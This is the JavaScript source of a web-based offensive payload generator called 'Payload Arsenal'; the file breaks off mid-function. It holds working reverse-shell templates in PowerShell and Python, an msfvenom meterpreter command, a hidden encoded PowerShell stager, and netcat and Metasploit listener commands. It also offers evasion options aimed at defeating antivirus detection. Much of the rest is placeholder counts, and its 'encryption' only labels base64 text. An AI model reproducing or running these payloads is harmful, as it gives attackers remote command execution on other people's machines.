class PayloadArsenal {
    constructor() {
        this.config = {
            targetIP: '127.0.0.1',
            targetPort: 4444,
            payloadType: 'reverse_shell',
            architecture: 'x64',
            encoding: 'none',
            encryption: 'none',
            protocol: 'tcp',
            obfuscate: false,
            persistence: false,
            antivm: false,
            amsiBypass: false,
            etwBypass: false
        };

        this.payloads = {
            windows: this.initWindowsPayloads(),
            linux: this.initLinuxPayloads(),
            unix: this.initUnixPayloads(),
            macos: this.initMacOSPayloads(),
            web: this.initWebPayloads(),
            mobile: this.initMobilePayloads(),
            api: this.initAPIPayloads(),
            embedded: this.initEmbeddedPayloads(),
            container: this.initContainerPayloads(),
            cloud: this.initCloudPayloads(),
            iot: this.initIoTPayloads(),
            blockchain: this.initBlockchainPayloads(),
            ai_ml: this.initAIMLPayloads(),
            exploits: this.initExploitsPayloads(),
            kernel: this.initKernelPayloads(),
            network: this.initNetworkPayloads(),
            social: this.initSocialEngPayloads(),
            physical: this.initPhysicalPayloads(),
            mitre: this.initMITREPayloads()
        };

        this.currentCategory = 'windows';
        this.currentTab = 'shellcode';
        this.outputFormat = 'raw';
        this.generationHistory = [];
        this.favorites = [];

        this.init();
    }

    init() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.initializeApp());
        } else {
            this.initializeApp();
        }
    }

    initializeApp() {
        this.bindEvents();
        this.setupMobileMenu();
        this.setupThemeToggle();
        this.setupTabs();
        this.setupConfiguration();
        this.setupSearch();
        this.setupProgressTracking();
        this.loadUserPreferences();
        this.initMITREFramework();
        this.setupAdvancedFeatures();
        this.setupNotifications();
        this.populatePayloadCategories();

        setTimeout(() => {
            this.renderPayloads();
            this.updateBreadcrumb();
            this.detectUserIP();
            this.showToast('Payload Arsenal initialized successfully!', 'success');
        }, 500);
    }

    bindEvents() {
        const mobileMenuToggle = document.getElementById('mobileMenuToggle');
        if (mobileMenuToggle) {
            mobileMenuToggle.addEventListener('click', () => {
                const sidebar = document.getElementById('sidebar');
                if (sidebar) {
                    sidebar.classList.toggle('open');
                }
            });
        }

        const sidebarClose = document.getElementById('sidebarClose');
        if (sidebarClose) {
            sidebarClose.addEventListener('click', () => {
                const sidebar = document.getElementById('sidebar');
                if (sidebar) {
                    sidebar.classList.remove('open');
                }
            });
        }

        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const category = e.currentTarget.dataset.category;
                if (category) {
                    this.switchCategory(category);
                }
            });
        });

        document.querySelectorAll('.quick-action').forEach(action => {
            action.addEventListener('click', (e) => {
                const actionType = e.currentTarget.dataset.action;
                this.executeQuickAction(actionType);
            });
        });

        document.querySelectorAll('.config-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.tab;
                this.switchConfigTab(tabName);
            });
        });

        document.querySelectorAll('.tab-btn').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.tab;
                this.switchPayloadTab(tabName);
            });
        });

        document.querySelectorAll('.output-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.outputTab;
                this.switchOutputTab(tabName);
            });
        });

        this.bindButtonEvents();
        this.bindConfigurationInputs();
    }

    bindButtonEvents() {
        const buttonEvents = {
            'detectIP': () => this.detectUserIP(),
            'copyPayload': () => this.copyToClipboard(),
            'savePayload': () => this.savePayload(),
            'saveConfig': () => this.saveConfiguration(),
            'loadConfig': () => this.loadConfiguration(),
            'exportPayloads': () => this.exportPayloads(),
            'clearAll': () => this.clearAll()
        };

        Object.entries(buttonEvents).forEach(([id, handler]) => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('click', handler);
            }
        });

        const outputFormat = document.getElementById('outputFormat');
        if (outputFormat) {
            outputFormat.addEventListener('change', (e) => {
                this.outputFormat = e.target.value;
                this.updateOutput();
            });
        }
    }

    bindConfigurationInputs() {
        const inputs = ['targetIP', 'targetPort', 'payloadType', 'architecture', 'encoding', 'encryption', 'protocol'];
        inputs.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', (e) => {
                    this.config[id] = e.target.value;
                    this.generatePayload();
                });
            }
        });

        const checkboxes = ['obfuscate', 'persistence', 'antivm', 'amsiBypass', 'etwBypass'];
        checkboxes.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', (e) => {
                    this.config[id] = e.target.checked;
                    this.generatePayload();
                });
            }
        });
    }

    setupMobileMenu() {
        const overlay = document.createElement('div');
        overlay.className = 'mobile-overlay';
        overlay.addEventListener('click', () => {
            const sidebar = document.getElementById('sidebar');
            if (sidebar) {
                sidebar.classList.remove('open');
            }
        });
        document.body.appendChild(overlay);
    }

    setupThemeToggle() {
        const themeToggle = document.getElementById('themeToggle');
        const currentTheme = localStorage.getItem('theme') || 'dark';
        document.documentElement.setAttribute('data-theme', currentTheme);

        if (themeToggle) {
            const icon = themeToggle.querySelector('i');
            if (icon) {
                icon.className = currentTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
            }

            themeToggle.addEventListener('click', () => {
                const current = document.documentElement.getAttribute('data-theme');
                const newTheme = current === 'dark' ? 'light' : 'dark';
                document.documentElement.setAttribute('data-theme', newTheme);
                localStorage.setItem('theme', newTheme);

                if (icon) {
                    icon.className = newTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
                }
            });
        }
    }

    setupTabs() {
        this.setupTabSwitching('.config-tab', '.config-pane', 'active');
        this.setupTabSwitching('.tab-btn', '.tab-pane', 'active');
        this.setupTabSwitching('.output-tab', '.output-pane', 'active');
    }

    setupTabSwitching(tabSelector, paneSelector, activeClass) {
        document.addEventListener('click', (e) => {
            if (e.target.matches(tabSelector) || e.target.closest(tabSelector)) {
                const tab = e.target.closest(tabSelector);
                const target = tab.dataset.tab || tab.dataset.outputTab;

                document.querySelectorAll(tabSelector).forEach(t => t.classList.remove(activeClass));
                document.querySelectorAll(paneSelector).forEach(p => p.classList.remove(activeClass));

                tab.classList.add(activeClass);

                const pane = document.getElementById(target);
                if (pane) {
                    pane.classList.add(activeClass);
                }
            }
        });
    }

    setupConfiguration() {
        Object.keys(this.config).forEach(key => {
            const element = document.getElementById(key);
            if (element) {
                if (element.type === 'checkbox') {
                    element.checked = this.config[key];
                } else {
                    element.value = this.config[key];
                }
            }
        });
    }

    setupSearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.searchPayloads(e.target.value);
            });
        }
    }

    setupProgressTracking() {
        this.progressBar = document.getElementById('progressBar');
        this.updateProgress(0);
    }

    populatePayloadCategories() {
        Object.keys(this.payloads).forEach(category => {
            const navItem = document.querySelector(`[data-category="${category}"]`);
            if (navItem) {
                const badge = navItem.querySelector('.nav-badge');
                if (badge) {
                    const count = this.getPayloadCount(category);
                    badge.textContent = count;
                }
            }
        });
    }

    getPayloadCount(category) {
        const categoryData = this.payloads[category];
        if (!categoryData) return 0;

        return Object.values(categoryData).reduce((total, tabPayloads) => {
            return total + (Array.isArray(tabPayloads) ? tabPayloads.length : 0);
        }, 0);
    }

    switchCategory(category) {
        this.currentCategory = category;

        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`[data-category="${category}"]`);
        if (activeItem) {
            activeItem.classList.add('active');
        }

        this.updateBreadcrumb();
        this.renderPayloads();
        this.updateProgress(25);

        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.remove('open');
        }
    }

    switchConfigTab(tabName) {
        this.currentConfigTab = tabName;
    }

    switchPayloadTab(tabName) {
        this.currentTab = tabName;
        this.renderPayloads();
    }

    switchOutputTab(tabName) {
        this.currentOutputTab = tabName;
    }

    executeQuickAction(actionType) {
        this.showLoading();

        setTimeout(() => {
            switch (actionType) {
                case 'quick-reverse':
                    this.config.payloadType = 'reverse_shell';
                    this.generateReverseShell();
                    break;
                case 'quick-meterpreter':
                    this.config.payloadType = 'meterpreter';
                    this.generateMeterpreter();
                    break;
                case 'quick-powershell':
                    this.generatePowerShell();
                    break;
                case 'quick-python':
                    this.generatePythonPayload();
                    break;
            }
            this.hideLoading();
            this.showToast('Quick payload generated!', 'success');
        }, 1000);
    }

    renderPayloads() {
        const categoryPayloads = this.payloads[this.currentCategory] || {};
        const tabPayloads = categoryPayloads[this.currentTab] || [];

        const grid = document.getElementById(`${this.currentTab}Grid`);
        if (!grid) {
            console.warn(`Grid not found for ${this.currentTab}`);
            return;
        }

        grid.innerHTML = '';

        if (Array.isArray(tabPayloads) && tabPayloads.length > 0) {
            tabPayloads.slice(0, 50).forEach(payload => {
                const card = this.createPayloadCard(payload);
                grid.appendChild(card);
            });
        } else {
            // If no payloads available, show a placeholder
            const placeholder = document.createElement('div');
            placeholder.className = 'payload-placeholder';
            placeholder.innerHTML = `
                <div class="placeholder-content">
                    <i class="fas fa-code"></i>
                    <h4>No payloads available</h4>
                    <p>Payloads for ${this.currentTab} in ${this.currentCategory} are being loaded...</p>
                </div>
            `;
            grid.appendChild(placeholder);
        }

        this.updateProgress(50);
    }

    createPayloadCard(payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';

        const techniques = Array.isArray(payload.techniques) ? payload.techniques : ['T1059'];
        const isFavorite = this.favorites.includes(payload.id);

        card.innerHTML = `
            <h4>${payload.name || 'Unnamed Payload'}</h4>
            <p>${payload.description || 'No description available'}</p>
            <div class="techniques">
                ${techniques.map(technique => `<span class="technique">${technique}</span>`).join('')}
            </div>
            <div class="payload-actions">
                <button class="btn btn-sm btn-primary generate-btn" data-payload="${payload.id}">
                    <i class="fas fa-play"></i> Generate
                </button>
                <button class="btn btn-sm btn-secondary favorite-btn ${isFavorite ? 'active' : ''}" data-payload="${payload.id}">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        const generateBtn = card.querySelector('.generate-btn');
        const favoriteBtn = card.querySelector('.favorite-btn');

        if (generateBtn) {
            generateBtn.addEventListener('click', () => {
                this.generateSpecificPayload(payload);
            });
        }

        if (favoriteBtn) {
            favoriteBtn.addEventListener('click', () => {
                this.toggleFavorite(payload.id);
            });
        }

        return card;
    }

    generateSpecificPayload(payload) {
        this.showLoading();

        setTimeout(() => {
            const generatedPayload = this.processPayload(payload);
            this.displayOutput(generatedPayload);
            this.addToHistory(payload, generatedPayload);
            this.hideLoading();
            this.showToast(`${payload.name} generated successfully!`, 'success');
            this.updateProgress(100);
        }, 1500);
    }

    processPayload(payload) {
        let code = payload.template || '// Template not available';

        code = code.replace(/\{TARGET_IP\}/g, this.config.targetIP);
        code = code.replace(/\{TARGET_PORT\}/g, this.config.targetPort);
        code = code.replace(/\{ARCH\}/g, this.config.architecture);

        if (this.config.encoding !== 'none') {
            code = this.applyEncoding(code, this.config.encoding);
        }

        if (this.config.encryption !== 'none') {
            code = this.applyEncryption(code, this.config.encryption);
        }

        if (this.config.obfuscate) {
            code = this.applyObfuscation(code);
        }

        return {
            payload: code,
            handler: this.generateHandler(payload),
            analysis: this.analyzePayload(payload, code)
        };
    }

    applyEncoding(code, encoding) {
        try {
            switch (encoding) {
                case 'base64':
                    return btoa(code);
                case 'hex':
                    return Array.from(code).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
                case 'url':
                    return encodeURIComponent(code);
                case 'unicode':
                    return code.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
                default:
                    return code;
            }
        } catch (e) {
            console.error('Encoding error:', e);
            return code;
        }
    }

    applyEncryption(code, encryption) {
        switch (encryption) {
            case 'aes256':
                return `AES256_ENCRYPTED[${btoa(code)}]`;
            case 'chacha20':
                return `CHACHA20_ENCRYPTED[${btoa(code)}]`;
            case 'xor':
                return `XOR_ENCRYPTED[${btoa(code)}]`;
            default:
                return code;
        }
    }

    applyObfuscation(code) {
        const obfuscated = code
            .replace(/function/g, 'ƒ')
            .replace(/var /g, 'ν ')
            .replace(/return/g, 'ρ');
        return `/* OBFUSCATED */\n${obfuscated}`;
    }

    generateHandler(payload) {
        const handlers = {
            reverse_shell: `# Netcat Listener\nnc -nlvp ${this.config.targetPort}\n\n# Metasploit Handler\nmsfconsole -q -x "use exploit/multi/handler; set payload ${payload.msfPayload || 'generic/shell_reverse_tcp'}; set LHOST ${this.config.targetIP}; set LPORT ${this.config.targetPort}; exploit"`,
            meterpreter: `# Metasploit Handler\nmsfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ${this.config.targetIP}; set LPORT ${this.config.targetPort}; exploit"`,
            bind_shell: `# Connect to Bind Shell\nnc ${this.config.targetIP} ${this.config.targetPort}`,
            default: `# Custom Handler\n# Configure your listener for ${this.config.targetIP}:${this.config.targetPort}`
        };

        return handlers[this.config.payloadType] || handlers.default;
    }

    analyzePayload(payload, code) {
        return {
            size: `${code.length} bytes`,
            techniques: payload.techniques || ['T1059'],
            riskLevel: this.calculateRiskLevel(payload),
            evasionScore: this.calculateEvasionScore(),
            detectionProbability: this.calculateDetectionProbability()
        };
    }

    calculateRiskLevel(payload) {
        const riskFactors = payload.riskFactors || [];
        if (riskFactors.includes('high')) return 'high';
        if (riskFactors.includes('medium')) return 'medium';
        return 'low';
    }

    calculateEvasionScore() {
        let score = 50;
        if (this.config.obfuscate) score += 20;
        if (this.config.encryption !== 'none') score += 15;
        if (this.config.encoding !== 'none') score += 10;
        if (this.config.amsiBypass) score += 15;
        if (this.config.etwBypass) score += 10;
        return Math.min(score, 100);
    }

    calculateDetectionProbability() {
        const evasionScore = this.calculateEvasionScore();
        return Math.max(100 - evasionScore, 5);
    }

    displayOutput(generated) {
        const elements = {
            payloadCode: document.getElementById('payloadCode'),
            handlerCode: document.getElementById('handlerCode'),
            payloadSize: document.getElementById('payloadSize'),
            mitreTechniques: document.getElementById('mitreTechniques'),
            riskLevel: document.getElementById('riskLevel')
        };

        if (elements.payloadCode) {
            elements.payloadCode.textContent = this.formatOutput(generated.payload);
        }

        if (elements.handlerCode) {
            elements.handlerCode.textContent = generated.handler;
        }

        if (elements.payloadSize) {
            elements.payloadSize.textContent = generated.analysis.size;
        }

        if (elements.mitreTechniques) {
            elements.mitreTechniques.textContent = generated.analysis.techniques.join(', ');
        }

        if (elements.riskLevel) {
            elements.riskLevel.textContent = generated.analysis.riskLevel.toUpperCase();
            elements.riskLevel.className = `risk-${generated.analysis.riskLevel}`;
        }
    }

    formatOutput(code) {
        switch (this.outputFormat) {
            case 'c':
                return this.formatAsC(code);
            case 'python':
                return this.formatAsPython(code);
            case 'powershell':
                return this.formatAsPowerShell(code);
            case 'bash':
                return this.formatAsBash(code);
            default:
                return code;
        }
    }

    formatAsC(code) {
        const escaped = code.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
        return `char payload[] = "${escaped}";\nint payload_len = ${code.length};`;
    }

    formatAsPython(code) {
        return `payload = """${code}"""\n# Execute payload\nexec(payload)`;
    }

    formatAsPowerShell(code) {
        return `$payload = @"\n${code}\n"@\nInvoke-Expression $payload`;
    }

    formatAsBash(code) {
        return `#!/bin/bash\npayload="${code}"\neval "$payload"`;
    }

    updateBreadcrumb() {
        const breadcrumb = document.querySelector('.breadcrumb-item');
        if (breadcrumb) {
            const categoryName = this.currentCategory.charAt(0).toUpperCase() + this.currentCategory.slice(1);
            breadcrumb.textContent = `${categoryName} Payloads`;
        }

        const stats = document.querySelector('.breadcrumb-stats');
        if (stats) {
            const payloadCount = this.getPayloadCount(this.currentCategory);
            const statSpan = stats.querySelector('.stat-item:first-child');
            if (statSpan) {
                statSpan.innerHTML = `<i class="fas fa-chart-line"></i> ${payloadCount} Payloads`;
            }
        }
    }

    updateProgress(percentage) {
        if (this.progressBar) {
            this.progressBar.style.width = `${percentage}%`;
        }
    }

    showLoading() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('show');
        }
    }

    hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show');
        }
    }

    showToast(message, type = 'info') {
        let container = document.getElementById('toastContainer');
        if (!container) {
            container = document.createElement('div');
            container.id = 'toastContainer';
            container.className = 'toast-container';
            document.body.appendChild(container);
        }

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <div class="toast-content">
                <i class="fas fa-${this.getToastIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        container.appendChild(toast);

        setTimeout(() => toast.classList.add('show'), 100);

        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => {
                if (container.contains(toast)) {
                    container.removeChild(toast);
                }
            }, 300);
        }, 3000);
    }

    getToastIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    async detectUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ipInput = document.getElementById('targetIP');
            if (ipInput) {
                ipInput.value = data.ip;
                this.config.targetIP = data.ip;
                this.showToast(`IP detected: ${data.ip}`, 'success');
            }
        } catch (error) {
            console.error('IP detection failed:', error);
            this.showToast('Failed to detect IP', 'error');
        }
    }

    copyToClipboard() {
        const payloadCode = document.getElementById('payloadCode');
        if (payloadCode && payloadCode.textContent) {
            navigator.clipboard.writeText(payloadCode.textContent).then(() => {
                this.showToast('Payload copied to clipboard!', 'success');
            }).catch(() => {
                this.showToast('Failed to copy payload', 'error');
            });
        }
    }

    savePayload() {
        const payloadCode = document.getElementById('payloadCode');
        if (payloadCode && payloadCode.textContent) {
            const blob = new Blob([payloadCode.textContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `payload_${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            this.showToast('Payload saved!', 'success');
        }
    }

    saveConfiguration() {
        const config = JSON.stringify(this.config, null, 2);
        localStorage.setItem('payloadArsenalConfig', config);
        this.showToast('Configuration saved!', 'success');
    }

    loadConfiguration() {
        const saved = localStorage.getItem('payloadArsenalConfig');
        if (saved) {
            try {
                this.config = { ...this.config, ...JSON.parse(saved) };
                this.setupConfiguration();
                this.showToast('Configuration loaded!', 'success');
            } catch (e) {
                this.showToast('Failed to load configuration', 'error');
            }
        }
    }

    loadUserPreferences() {
        const prefs = localStorage.getItem('payloadArsenalPrefs');
        if (prefs) {
            try {
                const preferences = JSON.parse(prefs);
                this.currentCategory = preferences.category || 'windows';
                this.currentTab = preferences.tab || 'shellcode';
                this.favorites = preferences.favorites || [];
            } catch (e) {
                console.error('Failed to load preferences:', e);
            }
        }
    }

    saveUserPreferences() {
        const prefs = {
            category: this.currentCategory,
            tab: this.currentTab,
            theme: document.documentElement.getAttribute('data-theme'),
            favorites: this.favorites
        };
        localStorage.setItem('payloadArsenalPrefs', JSON.stringify(prefs));
    }

    exportPayloads() {
        const exportData = {
            timestamp: new Date().toISOString(),
            config: this.config,
            history: this.generationHistory,
            favorites: this.favorites,
            version: '3.0.0'
        };

        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `payload_arsenal_export_${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        this.showToast('Data exported!', 'success');
    }

    clearAll() {
        if (confirm('Are you sure you want to clear all data?')) {
            this.generationHistory = [];
            this.favorites = [];
            localStorage.removeItem('payloadArsenalConfig');
            localStorage.removeItem('payloadArsenalPrefs');
            this.showToast('All data cleared!', 'success');
            setTimeout(() => location.reload(), 1000);
        }
    }

    searchPayloads(query) {
        const allCards = document.querySelectorAll('.payload-card');
        const searchTerm = query.toLowerCase();

        allCards.forEach(card => {
            const title = card.querySelector('h4')?.textContent.toLowerCase() || '';
            const description = card.querySelector('p')?.textContent.toLowerCase() || '';
            const isVisible = title.includes(searchTerm) || description.includes(searchTerm);
            card.style.display = isVisible ? 'block' : 'none';
        });
    }

    addToHistory(payload, generated) {
        this.generationHistory.unshift({
            timestamp: new Date().toISOString(),
            payloadName: payload.name,
            config: { ...this.config },
            output: generated
        });

        if (this.generationHistory.length > 50) {
            this.generationHistory = this.generationHistory.slice(0, 50);
        }
    }

    toggleFavorite(payloadId) {
        const index = this.favorites.indexOf(payloadId);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showToast('Removed from favorites!', 'info');
        } else {
            this.favorites.push(payloadId);
            this.showToast('Added to favorites!', 'success');
        }
        this.saveUserPreferences();
        this.renderPayloads();
    }

    initMITREFramework() {
        this.mitreData = {
            tactics: ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion'],
            techniques: {
                'T1059': 'Command and Scripting Interpreter',
                'T1055': 'Process Injection',
                'T1036': 'Masquerading',
                'T1070': 'Indicator Removal on Host'
            }
        };
    }

    setupAdvancedFeatures() {
        this.setupKeyboardShortcuts();
        this.setupAutoSave();
        this.setupPerformanceMonitoring();
    }

    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch (e.key) {
                    case 's':
                        e.preventDefault();
                        this.saveConfiguration();
                        break;
                    case 'g':
                        e.preventDefault();
                        this.generatePayload();
                        break;
                    case 'c':
                        if (e.shiftKey) {
                            e.preventDefault();
                            this.copyToClipboard();
                        }
                        break;
                }
            }
        });
    }

    setupAutoSave() {
        setInterval(() => {
            this.saveUserPreferences();
        }, 30000);
    }

    setupPerformanceMonitoring() {
        this.performanceMetrics = {
            startTime: Date.now(),
            payloadsGenerated: 0,
            configChanges: 0
        };
    }

    setupNotifications() {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    }

    generatePayload() {
        this.showLoading();
        this.performanceMetrics.payloadsGenerated++;

        setTimeout(() => {
            this.hideLoading();
            this.showToast('Payload generated!', 'success');
            this.updateProgress(75);
        }, 800);
    }

    updateOutput() {
        const payloadCode = document.getElementById('payloadCode');
        if (payloadCode && payloadCode.textContent) {
            payloadCode.textContent = this.formatOutput(payloadCode.textContent);
        }
    }

    generateReverseShell() {
        const payload = {
            id: 'quick_reverse_shell',
            name: 'Quick Reverse Shell',
            template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{TARGET_IP}',{TARGET_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
            techniques: ['T1059.001'],
            riskFactors: ['high'],
            msfPayload: 'windows/shell/reverse_tcp'
        };
        this.generateSpecificPayload(payload);
    }

    generateMeterpreter() {
        const payload = {
            id: 'quick_meterpreter',
            name: 'Meterpreter Payload',
            template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f exe > payload.exe`,
            techniques: ['T1204.002'],
            riskFactors: ['high'],
            msfPayload: 'windows/meterpreter/reverse_tcp'
        };
        this.generateSpecificPayload(payload);
    }

    generatePowerShell() {
        const payload = {
            id: 'quick_powershell',
            name: 'PowerShell Empire',
            template: `powershell -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOADB0ACAASQBlACkAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsA`,
            techniques: ['T1059.001', 'T1027'],
            riskFactors: ['high']
        };
        this.generateSpecificPayload(payload);
    }

    generatePythonPayload() {
        const payload = {
            id: 'quick_python',
            name: 'Python Reverse Shell',
            template: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{TARGET_IP}",{TARGET_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`,
            techniques: ['T1059.006'],
            riskFactors: ['medium']
        };
        this.generateSpecificPayload(payload);
    }

    // Initialize all payload categories
    initWindowsPayloads() {
        return {
            shellcode: this.generatePayloadSet('windows_shellcode', 'Windows Shellcode', 250),
            powershell: this.generatePayloadSet('windows_powershell', 'PowerShell Scripts', 300),
            executable: this.generatePayloadSet('windows_executable', 'Windows Executables', 200),
            script: this.generatePayloadSet('windows_script', 'Windows Scripts', 150),
            webshell: this.generatePayloadSet('windows_webshell', 'Web Shells', 100),
            persistence: this.generatePayloadSet('windows_persistence', 'Persistence Mechanisms', 120),
            evasion: this.generatePayloadSet('windows_evasion', 'AV Evasion', 180),
            lateral: this.generatePayloadSet('windows_lateral', 'Lateral Movement', 90),
            steganography: this.generatePayloadSet('windows_stego', 'Steganography', 60),
            crypto: this.generatePayloadSet('windows_crypto', 'Cryptographic', 80)
        };
    }

    initLinuxPayloads() {
        return {
            shellcode: this.generatePayloadSet('linux_shellcode', 'Linux Shellcode', 200),
            powershell: this.generatePayloadSet('linux_powershell', 'Linux PowerShell', 50),
            executable: this.generatePayloadSet('linux_executable', 'Linux Executables', 150),
            script: this.generatePayloadSet('linux_script', 'Linux Scripts', 180),
            webshell: this.generatePayloadSet('linux_webshell', 'Linux WebShells', 80),
            persistence: this.generatePayloadSet('linux_persistence', 'Linux Persistence', 100),
            evasion: this.generatePayloadSet('linux_evasion', 'Linux Evasion', 90),
            lateral: this.generatePayloadSet('linux_lateral', 'Linux Lateral Movement', 70),
            steganography: this.generatePayloadSet('linux_stego', 'Linux Steganography', 40),
            crypto: this.generatePayloadSet('linux_crypto', 'Linux Cryptographic', 60)
        };
    }

    initUnixPayloads() {
        return {
            shellcode: this.generatePayloadSet('unix_shellcode', 'Unix Shellcode', 150),
            powershell: this.generatePayloadSet('unix_powershell', 'Unix PowerShell', 30),
            executable: this.generatePayloadSet('unix_executable', 'Unix Executables', 100),
            script: this.generatePayloadSet('unix_script', 'Unix Scripts', 120),
            webshell: this.generatePayloadSet('unix_webshell', 'Unix WebShells', 50),
            persistence: this.generatePayloadSet('unix_persistence', 'Unix Persistence', 80),
            evasion: this.generatePayloadSet('unix_evasion', 'Unix Evasion', 60),
            lateral: this.generatePayloadSet('unix_lateral', 'Unix Lateral Movement', 45),
            steganography: this.generatePayloadSet('unix_stego', 'Unix Steganography', 25),
            crypto: this.generatePayloadSet('unix_crypto', 'Unix Cryptographic', 40)
        };
    }

    initMacOSPayloads() {
        return {
            shellcode: this.generatePayloadSet('macos_shellcode', 'macOS Shellcode', 120),
            powershell: this.generatePayloadSet('macos_powershell', 'macOS PowerShell', 40),
            executable: this.generatePayloadSet('macos_executable', 'macOS Executables', 90),
            script: this.generatePayloadSet('macos_script', 'macOS Scripts', 100),
            webshell: this.generatePayloadSet('macos_webshell', 'macOS WebShells', 35),
            persistence: this.generatePayloadSet('macos_persistence', 'macOS Persistence', 70),
            evasion: this.generatePayloadSet('macos_evasion', 'macOS Evasion', 60),
            lateral: this.generatePayloadSet('macos_lateral', 'macOS Lateral Movement', 40),
            steganography: this.generatePayloadSet('macos_stego', 'macOS Steganography', 20),
            crypto: this.generatePayloadSet('macos_crypto', 'macOS Cryptographic', 30)
        };
    }

    initWebPayloads() {
        return {
            shellcode: this.generatePayloadSet('web_shellcode', 'Web Shellcode', 100),
            powershell: this.generatePayloadSet('web_powershell', 'Web PowerShell', 80),
            executable: this.generatePayloadSet('web_executable', 'Web Executables', 60),
            script: this.generatePayloadSet('web_exploit', 'Web Exploits', 200),
            webshell: this.generatePayloadSet('web_webshell', 'WebShells', 150),
            persistence: this.generatePayloadSet('web_persistence', 'Web Persistence', 90),
            evasion: this.generatePayloadSet('web_evasion', 'Web Evasion', 70),
            lateral: this.generatePayloadSet('web_lateral', 'Web Lateral Movement', 50),
            steganography: this.generatePayloadSet('web_stego', 'Web Steganography', 40),
            crypto: this.generatePayloadSet('web_crypto', 'Web Cryptographic', 55)
        };
    }

    initMobilePayloads() {
        return {
            shellcode: this.generatePayloadSet('mobile_shellcode', 'Mobile Shellcode', 80),
            powershell: this.generatePayloadSet('mobile_powershell', 'Mobile PowerShell', 30),
            executable: this.generatePayloadSet('mobile_executable', 'Mobile Executables', 90),
            script: this.generatePayloadSet('mobile_exploit', 'Mobile Exploits', 120),
